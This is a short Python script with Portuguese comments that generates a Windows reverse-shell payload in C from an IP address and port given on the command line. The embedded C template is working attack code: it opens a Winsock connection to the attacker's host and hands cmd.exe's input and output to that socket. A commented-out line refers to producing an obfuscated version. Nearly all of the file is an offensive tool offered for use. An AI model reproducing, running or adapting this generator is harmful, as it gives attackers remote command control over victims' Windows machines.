# feito por M1000 - github.com/curious0w
import sys
import os
import subprocess


def gerar_reverse_shell(ip_destino, porta_destino):
    # template com placeholders {IP} e {PORT}
    template = """\
// Payload reverso (Windows) - template
// Altere HOST e PORT conforme necessário
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define HOST "{IP}"  // altere aqui
#define PORT "{PORT}"           // altere aqui

int main() {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) {
        return 1;
    }

    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) return 1;

    server.sin_family = AF_INET;
    server.sin_port = htons(atoi(PORT));
    server.sin_addr.s_addr = inet_addr(HOST);

    WSAConnect(s, (SOCKADDR*)&server, sizeof(server), NULL, NULL, NULL, NULL);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

    TCHAR cmd[] = TEXT("cmd.exe");
    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

    return 0;
}
"""
    content = template.replace("{IP}", ip_destino).replace("{PORT}", str(porta_destino))
    nome_arquivo_saida = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}.c"
    #nome_arquivo_ofuscado = f"payload_rev_shell_{ip_destino.replace('.', '_')}_{porta_destino}_ofuscado.c"

    try:
        with open(nome_arquivo_saida, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f"Arquivo gerado: {nome_arquivo_saida}")

  

    except Exception as e:
        print(f"ERRO: Não foi possível escrever o arquivo final: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Uso: python escopos/C/escopo_c.py <IP> <PORTA>")
        sys.exit(1)
    ip_final = sys.argv[1]
    porta_final = sys.argv[2]
    gerar_reverse_shell(ip_final, porta_final)